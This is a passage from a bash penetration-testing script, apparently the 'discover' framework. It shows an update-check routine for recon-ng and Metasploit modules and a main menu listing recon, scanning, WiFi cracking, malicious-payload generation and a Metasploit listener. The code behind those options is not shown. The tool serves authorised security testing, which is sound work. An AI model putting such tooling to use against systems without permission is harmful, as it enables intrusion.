# Print from the last /, to the end of the line
sed -e 's:.*/\(.*\):\1:g' tmp > tmp-msf-used

grep -v -f tmp-msf-used tmp-msf-all >> tmp-updates

echo >> tmp-updates
echo >> tmp-updates

echo "recon-ng" >> tmp-updates
echo "==============================" >> tmp-updates
python /usr/share/recon-ng/recon-cli -M > tmp
grep '/' tmp | awk '{print $1}' | egrep -iv '(adobe|bozocrack|brute_suffix|cache_snoop|dev_diver|exploitation|freegeoip|fullcontact|gists_search|github_commits|github_dorks|github_repos|github_users|google_site_web|hashes_org|import|interesting_files|ipinfodb|jigsaw|linkedin_auth|locations|mailtester|mangle|metacrawler|migrate_contacts|migrate_hosts|namechk|profiler|pwnedlist|reporting|vulnerabilities)' > tmp2
cat $discover/resource/recon-ng.rc $discover/resource/recon-ng-active.rc | grep 'use' | grep -v 'query' | awk '{print $2}' | sort -u > tmp3
diff tmp2 tmp3 | grep '/' | egrep -v '(indeed|vpnhunter)' | awk '{print $2}' | sort -u >> tmp-updates

echo >> tmp-updates
echo >> tmp-updates

mv tmp-updates $home/data/updates.txt
rm tmp*

echo
echo $medium
echo
printf 'The new report is located at \x1B[1;33m%s\x1B[0m\n' $home/data/updates.txt
echo
echo
exit
}

##############################################################################################################

f_main(){
clear
f_banner

if [ ! -d $home/data ]; then
     mkdir -p $home/data
fi

echo -e "\x1B[1;34mRECON\x1B[0m"    # In MacOS X, using \x1B instead of \e. \033 would be ok for all platforms.
echo "1.  Domain"
echo "2.  Person"
echo "3.  Parse salesforce"
echo
echo -e "\x1B[1;34mSCANNING\x1B[0m"
echo "4.  Generate target list"
echo "5.  CIDR"
echo "6.  List"
echo "7.  IP, range, or URL"
echo "8.  Rerun Nmap scripts and MSF aux."
echo
echo -e "\x1B[1;34mWEB\x1B[0m"
echo "9.  Insecure direct object reference"
echo "10. Open multiple tabs in $browser"
echo "11. Nikto"
echo "12. SSL"
echo
echo -e "\x1B[1;34mMISC\x1B[0m"
echo "13. Crack WiFi"
echo "14. Parse XML"
echo "15. Generate a malicious payload"
echo "16. Start a Metasploit listener"
echo "17. Update"
echo "18. Exit"
echo
echo -n "Choice: "
read choice

case $choice in
     1) f_errorOSX; f_domain;;
     2) f_person;;
     3) f_salesforce;;
     4) f_generateTargetList;;
     5) f_cidr;;
     6) f_list;;
     7) f_single;;
     8) f_errorOSX; f_enumerate;;
     9) f_directObjectRef;;
     10) f_multitabs;;
     11) f_errorOSX; f_nikto;;
     12) f_ssl;;
     13) f_runlocally && $discover/crack-wifi.sh;;
     14) f_parse;;
     15) f_payload;;
     16) f_listener;;
     17) f_errorOSX; $discover/update.sh && exit;;
     18) clear && exit;;
     99) f_errorOSX; f_updates;;
     *) f_error;;
esac
}

##############################################################################################################

while true; do f_main; done
